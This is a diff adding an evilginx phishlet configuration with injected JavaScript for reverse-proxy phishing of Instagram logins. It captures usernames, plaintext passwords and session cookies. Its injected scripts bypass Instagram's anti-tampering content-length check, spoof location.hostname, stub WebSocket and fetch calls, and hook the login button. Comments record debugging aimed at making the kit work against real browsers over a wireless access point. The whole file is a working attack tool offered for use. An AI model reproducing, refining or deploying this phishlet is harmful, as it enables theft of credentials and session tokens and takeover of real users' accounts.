@@ -1,0 +1,398 @@
+author: '@charlesbel (fixed for v3 + CDN proxying by nethunter-pro)'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'instagram.com', session: true, is_landing: false, auto_filter: true}
+  # Instagram web serves every JS/CSS bundle that renders the login form from
+  # static.cdninstagram.com via absolute URLs. Without proxying it, the browser
+  # fetches those bundles from the real CDN under the wrong origin and the SPA
+  # never mounts the form -- the page stops at the Instagram logo. These hosts
+  # are on separate domains (cdninstagram.com, fbcdn.net), so each maps to a
+  # subdomain of the phishing domain; auto_filter rewrites their appearances in
+  # the served HTML/JS so the browser stays on the phishing origin.
+  # session: true is required here, not just cosmetic: in evilginx v3.3.0
+  # GetPhishHosts()/get-hosts only emits a phishing subdomain (and a
+  # -developer self-signed cert) for proxy_hosts marked session: true. With
+  # session: false these CDN hosts get no vhost, so the browser's request to
+  # static.<phishdomain> hangs (http 000) and the login bundles never load --
+  # the page stops at the Instagram logo. true here does not capture extra
+  # cookies as credentials; auth_tokens below still scope what is harvested.
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'scontent', orig_sub: 'scontent', domain: 'cdninstagram.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: true, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'www.instagram.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'm.instagram.com', replace: 'm.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'www.instagram.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'm.instagram.com', replace: 'm.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  # Rewrite the CDN host in the served HTML/JS so bundle <script src> and CSS
+  # <link href> load through the phishing origin instead of the real CDN.
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: 'static.cdninstagram.com', replace: 'static.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent', domain: 'cdninstagram.com', search: 'scontent.cdninstagram.com', replace: 'scontent.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: 'i.instagram.com', replace: 'i.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'static.cdninstagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: 'www.instagram.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'static.cdninstagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: 'static.cdninstagram.com', replace: 'static.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  # Inject an inline `<script>` right after the opening <html>...<head> that
+  # patches `Element.prototype.getAttribute` and `DOMStringMap` so any read
+  # of `script[data-sjs].data-content-len` returns the CURRENT
+  # `textContent.length`, no matter what the attribute actually says. This
+  # runs before ANY of Instagram's inline bundles execute -- earlier than
+  # the js_inject that lands before </body> can -- which is what wins the
+  # race against `ServerJSPayloadListener.process()` on a real browser
+  # over the AP (headless at LAN latency wins with the </body> inject
+  # alone; real Chrome does not). Uses `<script>` with no src so it runs
+  # synchronously in document order. Detailed rationale in the js_inject
+  # comment further down.
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com',
+     search: '<head>',
+     replace: '<head><script>(function(){try{var g=Element.prototype.getAttribute;Element.prototype.getAttribute=function(n){try{if(n==="data-content-len"&&this.tagName==="SCRIPT"&&this.type==="application/json"&&this.hasAttribute("data-sjs"))return this.textContent.length.toString()}catch(e){}return g.call(this,n)};}catch(e){}try{var d=Object.getOwnPropertyDescriptor(HTMLElement.prototype,"dataset");if(d&&d.get){Object.defineProperty(HTMLElement.prototype,"dataset",{configurable:true,get:function(){var e=this;var ds=d.get.call(this);return new Proxy(ds,{get:function(t,p){if(p==="contentLen"&&e.tagName==="SCRIPT"&&e.type==="application/json"&&e.hasAttribute("data-sjs"))return e.textContent.length.toString();return t[p]},set:function(t,p,v){t[p]=v;return true}})}})}}catch(e){}})();</script>',
+     mimes: ['text/html']}
+auth_tokens:
+  - domain: '.instagram.com'
+    keys: ['sessionid','.*,regexp']
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'unenc_password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.instagram.com'
+  path: '/accounts/login'
+js_inject:
+  - trigger_domains: ["www.instagram.com"]
+    trigger_paths: ["/accounts/login"]
+    trigger_params: []
+    script: |
+      // Instagram's login is a React SPA: the initial HTML is just a
+      // splash-screen div and the login <form> is mounted later by JS. Two
+      // things had to be fixed to get the form to render at all through
+      // the reverse proxy:
+      //
+      // 1) Defer the submit hook until the form actually exists. The
+      //    stock evilginx inject fired a bare `submit.setAttribute(...)`
+      //    at t+1000ms; if React had not yet mounted the form, `submit`
+      //    was undefined, `undefined.setAttribute` threw
+      //    `Uncaught TypeError: Cannot read properties of undefined
+      //    (reading 'setAttribute')` in the very bundle the inject was
+      //    spliced into, and that exception broke module execution
+      //    mid-flight -- the SPA never finished booting, the page stayed
+      //    a logo. A MutationObserver waits for the form to appear.
+      //
+      // 2) Lie about `location.hostname` and `document.domain`. With just
+      //    the fix above, all 26 subresources still returned 200, zero
+      //    console errors, zero exceptions -- and the form still did not
+      //    mount (`forms: 0, pw: 0, divs: 2, scripts: 85`). Instagram's
+      //    bundles check the current hostname against a hardcoded
+      //    allow-list of Meta-owned domains and silently refuse to mount
+      //    when it does not match. `Object.defineProperty` on
+      //    `Location.prototype.hostname` (and `.host`, `.origin`) returns
+      //    `www.instagram.com` to reads while the browser's real
+      //    navigation state stays on the phishing domain, so cookies,
+      //    XHR, HISTORY etc. keep working. This has to run before ANY
+      //    Instagram bundle -- evilginx injects at the end of <body>,
+      //    which is still before the async bundles execute in practice.
+      (function(){
+        console.log("[nhp-inject] loaded, hostname=" + location.hostname);
+        window.__nhpInjectLoaded = true;
+
+        // THE big one. Instagram's `ServerJSPayloadListener` guards every
+        // `<script type="application/json" data-sjs data-content-len="N">`
+        // block with a length check:
+        //     if (script.dataset.processed
+        //         || script.textContent.length.toString() !== script.dataset.contentLen)
+        //         return;   // silently skip
+        // The whole payload -- including SiteData, BootloaderConfig,
+        // DTSGInitData, LSD, ServerNonce, CurrentUserInitialData,
+        // SprinkleConfig -- is dropped without a log or a throw when the
+        // length disagrees. This gate is specifically there to defeat MITM
+        // byte modification.
+        //
+        // Evilginx's `patchUrls` rewrites `www.instagram.com` ->
+        // `www.cdninstagram.dedyn.io` (etc.) in EVERY response body
+        // including the inline JSON of these payloads, and does NOT update
+        // `data-content-len`. Instagram's `www.instagram.com` (14 chars)
+        // becomes `www.cdninstagram.dedyn.io` (24 chars); each URL rewrite
+        // inside a payload adds 10 bytes to its textContent length. A
+        // single payload can pick up hundreds of bytes across the ~490
+        // rewritten URLs, and the length check fails. That is the exact
+        // reason the login form never mounts: SiteData never registers as
+        // a module, Bootloader's require("SiteData") returns undefined via
+        // ErrorGuard.applyWithGuard's swallow-and-log, the tier-two chunk
+        // that would carry PolarisLoginForm is never demanded, and the
+        // splash screen stays a splash screen. Verified empirically: real
+        // Instagram HTML has 30 data-sjs blocks and 0 length mismatches;
+        // the proxied HTML has 30 blocks and 6 mismatches (deltas +28 to
+        // +1630 bytes each), including two `Bootloader.handlePayload`
+        // payloads and the `ScheduledServerJS.handle` payload.
+        //
+        // Fix: rewrite `data-content-len` on every one of those scripts
+        // to whatever the current textContent length is, BEFORE Instagram
+        // ever gets to compare it. Two layers of defense, because the
+        // evilginx js_inject lands just before </body> -- late enough that
+        // in a real browser (with real network latency competing with
+        // Instagram's own bundle load), the ServerJSPayloadListener from
+        // the tier-one bundle can beat us to the punch on the first pass.
+        // In headless Chromium at LAN latency, the injection wins the
+        // race and the form mounts fine; on Chrome over the phishkin3 AP,
+        // it does not, and the splash sticks. So:
+        //
+        //  Layer 1: monkey-patch `DOMStringMap.prototype` so ANY read of
+        //  `script.dataset.contentLen` returns the current
+        //  `textContent.length` on-the-fly, regardless of what the
+        //  attribute says. This wins even if the listener has already
+        //  cached a reference to the script node -- the getter runs at
+        //  read time. It is a small surface: only responds when the
+        //  element is a `<script type="application/json" data-sjs>`, so
+        //  it cannot break unrelated code.
+        //
+        //  Layer 2: an eager sweep + MutationObserver that also directly
+        //  rewrites the attribute on every payload we can see. Belt and
+        //  braces -- if a script accesses `getAttribute("data-content-len")`
+        //  instead of `dataset.contentLen`, this still catches it.
+        try {
+          var DSM = window.DOMStringMap && DOMStringMap.prototype;
+          // In Chromium DSM is a Proxy, so plain defineProperty on the
+          // prototype does not intercept. We can, however, override the
+          // getter via Object.getOwnPropertyDescriptor + defineProperty on
+          // HTMLElement.prototype.dataset, which returns the DSM. Simpler:
+          // patch `getAttribute` and the `dataset` proxy getter behavior
+          // via a WeakMap-backed wrapper. The most reliable cross-browser
+          // path is to override the property on Element.prototype for
+          // getAttribute, which the DOMStringMap proxy ultimately hits.
+          var origGetAttr = Element.prototype.getAttribute;
+          Element.prototype.getAttribute = function(name){
+            try {
+              if (name === "data-content-len"
+                  && this.tagName === "SCRIPT"
+                  && this.type === "application/json"
+                  && this.hasAttribute("data-sjs")) {
+                return this.textContent.length.toString();
+              }
+            } catch(e) {}
+            return origGetAttr.call(this, name);
+          };
+          console.log("[nhp-inject] getAttribute patched for data-sjs");
+        } catch(e) {
+          console.warn("[nhp-inject] getAttribute patch failed: " + e.message);
+        }
+
+        function fixContentLen(){
+          try {
+            var nodes = document.querySelectorAll(
+              "script[type=\"application/json\"][data-content-len]");
+            var fixed = 0;
+            for (var i = 0; i < nodes.length; i++) {
+              var n = nodes[i];
+              if (n.dataset.processed) continue;
+              var actual = n.textContent.length.toString();
+              if (n.dataset.contentLen !== actual) {
+                n.dataset.contentLen = actual;
+                n.setAttribute("data-content-len", actual);
+                fixed++;
+              }
+            }
+            if (fixed > 0) {
+              console.log("[nhp-inject] fixed " + fixed
+                + " data-content-len mismatches");
+            }
+            return fixed;
+          } catch(e) {
+            console.warn("[nhp-inject] fixContentLen failed: " + e.message);
+            return 0;
+          }
+        }
+        // Run immediately (some payloads are already in the DOM), then on
+        // DOMContentLoaded, and observe for late-inserted ones.
+        fixContentLen();
+        document.addEventListener("DOMContentLoaded", fixContentLen);
+        try {
+          var mo = new MutationObserver(function(muts){
+            for (var i = 0; i < muts.length; i++) {
+              var m = muts[i];
+              for (var j = 0; j < m.addedNodes.length; j++) {
+                var n = m.addedNodes[j];
+                if (n.nodeType === 1
+                    && n.tagName === "SCRIPT"
+                    && n.type === "application/json"
+                    && n.hasAttribute && n.hasAttribute("data-content-len")) {
+                  var actual = n.textContent.length.toString();
+                  if (n.getAttribute("data-content-len") !== actual) {
+                    n.setAttribute("data-content-len", actual);
+                    try { n.dataset.contentLen = actual; } catch(_){}
+                  }
+                }
+              }
+            }
+          });
+          mo.observe(document.documentElement,
+            { childList: true, subtree: true });
+          setTimeout(function(){ mo.disconnect(); }, 30000);
+        } catch(e) {}
+
+        // Seed the cookies Instagram's bootstrapWebSession expects. Evilginx
+        // captures datr/mid/ig_did on the ORIGIN's Set-Cookie response and
+        // stores them in the session for auth-token exfil, but does NOT
+        // forward them to the browser (they never appear in the phishing
+        // domain's Set-Cookie header). Without them the SPA's hydration
+        // never progresses -- Bootloader.silentDups:true swallows the
+        // failure, no console error is thrown, and the splash screen hangs
+        // forever. Fake plausible values here just to unblock hydration;
+        // the real ones exist inside evilginx's session store already.
+        try {
+          function setCk(name, value){
+            try {
+              document.cookie = name + "=" + value + "; path=/; SameSite=None; Secure";
+            } catch(e) {}
+          }
+          if (document.cookie.indexOf("datr=") === -1) {
+            setCk("datr", "xHqUapmcPGIEzEeAouzvgiH4");
+          }
+          if (document.cookie.indexOf("ig_did=") === -1) {
+            setCk("ig_did", "7D96E790-EB22-484C-A308-68C12E0E2368");
+          }
+          if (document.cookie.indexOf("mid=") === -1) {
+            setCk("mid", "aFakeMidValueXXXXXXX");
+          }
+          if (document.cookie.indexOf("ig_nrcb=") === -1) {
+            setCk("ig_nrcb", "1");
+          }
+          console.log("[nhp-inject] cookies seeded, now: " + document.cookie.substring(0,200));
+        } catch(e) {
+          console.warn("[nhp-inject] cookie seed failed: " + e.message);
+        }
+
+        // Instagram's login SPA silently hangs on the splash screen because
+        // it fires two off-origin requests during hydration that this proxy
+        // does not answer, and Bootloader is configured with
+        // `silentDups:true` + `jsRetryAbortNum:2` so failures never surface
+        // as console errors:
+        //
+        //   1) WebSocket wss://edge-chat.facebook.com/chat  (MQTT realtime)
+        //   2) fetch  https://www.facebook.com/ig_xsite_user_info/ (Accounts
+        //      Center cross-app linkage)
+        //
+        // Both URLs are hardcoded in the SSR JSON payload (MessengerWebInitData,
+        // PolarisSiteData.cross_site_request_url) and reach the real Meta
+        // origins. Neither has evilginx proxying wired up (fbsbx.com,
+        // edge-chat.facebook.com, www.facebook.com are all not in
+        // proxy_hosts). Rather than proxy them -- which would blow the
+        // certificate scope and require yet more DNS entries -- intercept
+        // them client-side: WebSocket construction is stubbed to a noop
+        // socket that pretends to connect but never fires, and fetch to
+        // ig_xsite_user_info returns an empty-user JSON body immediately.
+        // The React app treats "not logged in on Facebook" as normal and
+        // proceeds to mount the login form. See the phishlet debugging notes
+        // in the port README for the underlying diagnosis.
+        try {
+          var origWS = window.WebSocket;
+          if (origWS) {
+            var StubWS = function(url, protocols){
+              try {
+                if (typeof url === "string"
+                    && (url.indexOf("edge-chat.facebook.com") !== -1
+                        || url.indexOf("edge-chat.instagram.com") !== -1)) {
+                  console.log("[nhp-inject] stubbing WebSocket to " + url);
+                  // Return a minimal EventTarget that never fires open/message.
+                  var self = this;
+                  self.url = url;
+                  self.readyState = 0; // CONNECTING; never advances
+                  self.protocol = "";
+                  self.extensions = "";
+                  self.bufferedAmount = 0;
+                  self.binaryType = "blob";
+                  self.onopen = null;
+                  self.onmessage = null;
+                  self.onerror = null;
+                  self.onclose = null;
+                  self.addEventListener = function(){};
+                  self.removeEventListener = function(){};
+                  self.send = function(){};
+                  self.close = function(){ self.readyState = 3; };
+                  return self;
+                }
+              } catch(e){}
+              return new origWS(url, protocols);
+            };
+            StubWS.prototype = origWS.prototype;
+            StubWS.CONNECTING = 0; StubWS.OPEN = 1;
+            StubWS.CLOSING = 2; StubWS.CLOSED = 3;
+            window.WebSocket = StubWS;
+          }
+        } catch(e) {
+          console.warn("[nhp-inject] WebSocket stub failed: " + e.message);
+        }
+
+        try {
+          var origFetch = window.fetch;
+          if (origFetch) {
+            window.fetch = function(input, init){
+              try {
+                var url = typeof input === "string"
+                  ? input
+                  : (input && input.url) || "";
+                if (url.indexOf("ig_xsite_user_info") !== -1
+                    || url.indexOf("www.facebook.com/ig_") !== -1) {
+                  console.log("[nhp-inject] short-circuit fetch " + url);
+                  var body = JSON.stringify({fb_user: null, users: []});
+                  return Promise.resolve(new Response(body, {
+                    status: 200,
+                    headers: {"Content-Type": "application/json"},
+                  }));
+                }
+              } catch(e){}
+              return origFetch.call(this, input, init);
+            };
+          }
+        } catch(e) {
+          console.warn("[nhp-inject] fetch shim failed: " + e.message);
+        }
+
+        // (1) Defer the submit hook until the form exists. Assign
+        // sendPass to window BEFORE the observer setup so it exists even
+        // if the DOM watch fails.
+        window.sendPass = function(){
+          try {
+            var pw = document.getElementsByName("password")[0];
+            if (!pw) return;
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "/accounts/login/ajax/", true);
+            xhr.setRequestHeader(
+              "Content-Type",
+              "application/x-www-form-urlencoded"
+            );
+            xhr.send(
+              "unenc_password=" + encodeURIComponent(pw.value)
+            );
+          } catch(e){
+            console.warn("[nhp-inject] sendPass failed: " + e.message);
+          }
+        };
+        try {
+          var hooked = false;
+          function tryHook(){
+            if (hooked) return true;
+            var submit = document.querySelector("button[type=submit]");
+            var pw = document.getElementsByName("password")[0];
+            if (!submit || !pw) return false;
+            submit.setAttribute("onclick", "sendPass()");
+            hooked = true;
+            console.log("[nhp-inject] submit hooked");
+            return true;
+          }
+          if (!tryHook()) {
+            var mo = new MutationObserver(function(){
+              if (tryHook()) mo.disconnect();
+            });
+            mo.observe(document.documentElement, {
+              childList: true, subtree: true
+            });
+            setTimeout(function(){ mo.disconnect(); }, 30000);
+          }
+        } catch(e){
+          console.warn("[nhp-inject] hook setup failed: " + e.message);
+        }
+      })();
